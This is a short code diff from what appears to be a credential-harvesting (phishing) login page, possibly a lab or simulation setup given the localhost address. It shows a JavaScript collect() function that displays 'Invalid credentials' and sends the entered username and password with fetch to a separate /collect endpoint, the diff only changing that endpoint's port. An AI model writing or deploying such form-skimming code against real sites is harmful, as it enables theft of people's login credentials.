@@ -5,7 +5,7 @@ message_content = document.getElementById('message');
 message_content.innerHTML = 'Invalid credentials';
 
 function collect() {
-    fetch("http://127.0.0.1/collect", {
+    fetch("http://127.0.0.1:8888/collect", {
         body: "username=" + encodeURIComponent(this.event.target.elements.username.value) + "&password=" + encodeURIComponent(this.event.target.elements.password.value),
         headers: {
             "Content-Type": "application/x-www-form-urlencoded"
